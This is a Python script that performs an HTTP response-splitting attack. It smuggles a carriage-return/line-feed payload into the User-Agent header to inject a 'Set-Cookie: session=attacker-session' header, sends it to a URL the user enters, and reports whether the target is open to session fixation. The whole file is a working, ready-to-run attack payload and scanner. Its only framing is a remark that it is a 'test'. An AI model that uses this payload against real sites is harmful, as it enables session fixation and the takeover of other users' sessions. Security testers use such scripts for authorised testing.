import requests

def response_splitting_attack(target_url):
    # Malicious payload to inject new headers
    malicious_input = "value\r\nSet-Cookie: session=attacker-session; HttpOnly\r\n"

    # Example of injecting into a vulnerable "User-Agent" header
    headers = {
        "User-Agent": malicious_input
    }

    print(f"🚀 Sending Response Splitting Test to {target_url}...\n")

    try:
        response = requests.get(target_url, headers=headers, timeout=5)

        print("📜 Response Headers:")
        for key, value in response.headers.items():
            print(f"{key}: {value}")

        if "session=attacker-session" in response.headers.get("Set-Cookie", ""):
            print("\n✅ Target is vulnerable! Session fixation is possible.")
        else:
            print("\n❌ Target does not seem vulnerable.")

    except requests.exceptions.RequestException as e:
        print(f"⚠️ Request failed: {e}")

if __name__ == "__main__":
    target_url = input("🔗 Enter target URL (e.g., http://example.com): ").strip()
    response_splitting_attack(target_url)
